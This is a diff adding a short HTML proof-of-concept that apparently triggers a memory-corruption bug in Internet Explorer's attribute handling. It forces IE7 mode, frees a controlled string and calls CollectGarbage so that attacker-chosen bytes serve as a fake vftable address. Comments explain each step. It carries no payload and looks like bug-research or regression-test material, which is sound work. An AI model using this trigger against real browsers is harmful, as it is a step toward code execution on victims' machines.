@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<meta http-equiv="X-UA-Compatible" content="IE=7">
+<script>
+  oElement = document.createElement("HR");
+  var oAttr = document.createAttribute("size");
+  oAttr.nodeValue = oElement;
+  // Allocate and free a string with these bytes: 46 45 44 43 42 41 00 00
+  try { oElement.size = "\u4546\u4344\u4142"; } catch (e) {}
+  oElement.size = 0; // Reallocate string and set original value data to 30 00 00 00 42 41 00 00
+  oElement.size;
+  oElement.setAttributeNode(oAttr); // Overwrite oElement with original value
+  oElement.removeAttributeNode(oAttr);
+  CollectGarbage(); // Use original value data as addresss 0x414200000030 of a vftable
+</script>
